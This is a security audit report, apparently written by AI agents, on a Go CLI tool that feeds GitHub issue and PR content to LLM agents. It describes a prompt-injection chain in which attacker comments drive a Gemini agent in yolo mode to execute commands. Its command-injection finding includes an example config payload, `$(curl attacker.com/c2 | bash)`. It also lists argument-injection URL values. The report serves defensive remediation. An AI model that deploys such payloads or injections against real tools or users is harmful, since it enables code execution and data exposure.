# Security Audit Report: GitHub API and CLI Integration

**Subsystem:** `internal/cli/scan.go`, `internal/scan/scan.go`
**Date:** 2026-03-07
**Assessors:** 3 independent agents (Claude)
**Method:** Parallel assessment → adversarial review (steel man / critique / judge)

---

## Confirmed Vulnerabilities

### 1. Prompt Injection → RCE via Gemini Yolo Mode (Severity: HIGH)

**Identified by:** Agent 2 | **Judge confidence:** HIGH

**Location:** `internal/scan/scan.go:22-47`, `internal/cli/scan.go:538-564`, `internal/agent/gemini.go:53`

**Description:** Attacker-controlled GitHub content (issue bodies, PR descriptions, comments) is embedded unsanitized into LLM prompts via `fmt.Sprintf`. When the target agent is Gemini running in yolo mode (`-y`), no tool restrictions are enforced — unlike Claude, which is hardened with `--tools Read,Grep,Glob,LSP`. This creates a defense-in-depth failure where a single prompt injection attempt can achieve arbitrary code execution.

**Attack chain:**
1. Attacker posts a comment on a public GitHub issue containing prompt injection payload
2. Victim runs `conclave --gemini scan <issue-url>`
3. `loadWithGH()` fetches the issue body and all comments (including attacker's)
4. Content flows raw into `scan.Analyze()` → `fmt.Sprintf("...## Input Content\n%s\n...", content)`
5. Gemini in yolo mode processes injected instructions with full tool access, executing arbitrary commands

**Key inconsistency:** Claude's agent restricts tools to read-only operations (`Read,Grep,Glob,LSP`). Gemini has zero tool restrictions. The scan subsystem treats all agents identically.

**Remediation:**
- Restrict Gemini's tool access to match Claude's read-only posture, or implement an equivalent sandbox
- Consider content sanitization or structural separation (e.g., placing untrusted content in a file reference rather than inline in the prompt)
- Document the trust model difference between agents if the gap is intentional

---

### 2. Command Injection via Unquoted Model Name in Shell Commands (Severity: MEDIUM)

**Identified by:** Agent 3 | **Judge confidence:** MEDIUM

**Location:** `internal/agent/claude.go:100`, `internal/agent/gemini.go:55`, `internal/agent/codex.go:57,61`

**Description:** The `shellQuote()` function is correctly applied to prompt parameters but **not** to `model` or `reasoningEffort` parameters, which are concatenated directly into `bash -lc` command strings. These values originate from CLI flags and `~/.conclave/config.yaml` without sanitization.

**Vulnerable pattern:**
```go
claudeArgs += " --model " + a.model          // NO shellQuote()
claudeArgs += " -p " + shellQuote(prompt)     // shellQuote() used
cmd := exec.CommandContext(ctx, "bash", "-lc", claudeArgs)
```

**Attack chain:** A malicious config entry (`model: "$(curl attacker.com/c2 | bash)"`) achieves command substitution when the shell command is evaluated. Requires write access to `~/.conclave/config.yaml` (shared CI/CD environments, supply chain, social engineering).

**Remediation:**
- Apply `shellQuote()` to `a.model` and `a.reasoningEffort` at all three call sites
- Alternatively, validate model names against an allowlist pattern (e.g., `^[a-zA-Z0-9._:/-]+$`)
- This is a 3–6 line fix

---

### 3. Argument Injection in `gh` CLI via Unsanitized URL Components (Severity: MEDIUM)

**Identified by:** Agent 1 | **Judge confidence:** MEDIUM

**Location:** `internal/cli/scan.go:224-231,250,493-502`

**Description:** The PR/issue number extracted from URL path position `parts[3]` is never validated as numeric before being passed as a positional argument to `gh` CLI commands. Values starting with `--` are interpreted as flags by `gh`'s cobra/pflag parser, enabling argument injection (CWE-88).

**Vulnerable pattern:**
```go
number := parts[3]  // No numeric validation
metaCmd := exec.Command("gh", "pr", "view", number, "--repo", owner+"/"+repo, ...)
```

**Exploitation:** A URL like `.../pull/--web` causes `gh` to open a browser. A URL with `.../pull/--jq` can absorb the `--repo` flag's value, causing `gh` to operate on the wrong repository — potentially exposing private repo data that flows into reports and `--gist` uploads.

**Remediation:**
- Validate `number` as numeric: `if _, err := strconv.Atoi(number); err != nil { ... }`
- Insert `--` (end-of-flags sentinel) before positional arguments in all `exec.Command` calls to `gh`
- Apply similar validation to `owner` and `repo` (e.g., alphanumeric + hyphens only)

---

## Dismissed Findings

None. All three findings received RAISE verdicts.

---

## Prioritized Remediation

| Priority | Finding | Effort | Impact |
|----------|---------|--------|--------|
| **P1** | Gemini yolo mode tool restrictions | Medium | Eliminates RCE-via-prompt-injection vector |
| **P2** | `shellQuote()` for model/effort params | Trivial (3–6 lines) | Closes command injection in all agent constructors |
| **P3** | Numeric validation on URL-derived `number` | Trivial (2–3 lines) | Prevents argument injection in `gh` CLI calls |

**Systemic observation:** The codebase demonstrates security awareness (e.g., `shellQuote()` exists, Claude is restricted to read-only tools) but has gaps where the same discipline was not applied uniformly. All three findings stem from **inconsistent application of existing safeguards** — not missing awareness. A brief audit pass to verify that every value flowing into `bash -lc` commands is quoted, every `exec.Command` call to `gh` uses `--` sentinels, and every agent has explicit tool restrictions would close these gaps comprehensively.
